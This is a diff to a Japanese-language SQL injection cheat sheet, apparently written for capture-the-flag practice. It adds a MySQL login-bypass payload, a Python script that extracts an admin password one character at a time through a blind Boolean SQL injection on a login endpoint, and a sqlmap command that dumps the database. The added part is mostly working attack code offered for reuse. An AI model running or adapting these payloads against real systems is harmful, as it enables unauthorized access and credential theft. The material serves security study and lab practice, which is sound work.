@@ -46,6 +46,12 @@ DB のデータには興味がなく、ログイン画面をバイパスする�
 ' or 1=1;--
 ```
 
+MySQL の場合、-- の後に空白文字か制御文字が必要なため、下記の形もある
+
+```sql
+' or 1=1;-- -
+```
+
 ## Boolean Based SQLi
 
 データベース名を探索する  
@@ -82,6 +88,58 @@ a' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='デー
 ```sql
 -- Trueであるとき、passwordの1文字目はaであることが分かる
 a' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+```
+
+サンプルスクリプト
+
+```python
+#!/usr/bin/python3
+import sys
+import requests
+import string
+
+
+def send_p(url, query):
+    payload = {"username": query, "password": "admin"}
+    try:
+        r = requests.post(url, data=payload, timeout=3)
+    except requests.exceptions.ConnectTimeout:
+        print("[!] ConnectionTimeout: Try to adjust the timeout time")
+        sys.exit(1)
+    return r.text
+
+
+def main(addr):
+    url = f"http://{addr}/challenge3/login"
+    flag = ""
+    password_len = 38
+    # Not the most efficient way of doing it...
+    for i in range(1, password_len):
+        for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}":
+            # Convert char to hex and remove "0x"
+            h = hex(ord(c))[2:]
+            query = "admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1)," \
+                f"{i},1)=CAST(X'{h}' AS TEXT)--"
+
+            resp = send_p(url, query)
+            if not "Invalid" in resp:
+                flag += c
+                print(flag)
+    print(f"[+] FLAG: {flag}")
+
+
+if __name__ == "__main__":
+    if len(sys.argv) == 1:
+        print(f"Usage: {sys.argv[0]} MACHINE_IP:PORT")
+        sys.exit(0)
+    main(sys.argv[1])
+```
+
+sqlmap
+
+```shell
+sqlmap -u http://10.10.88.120:5000/challenge3/login --data="username=admin&password=admin"
+--level=5 --risk=3 --dbms=sqlite --technique=b --dump
 ```
 
 ## Time Based Blind SQLi
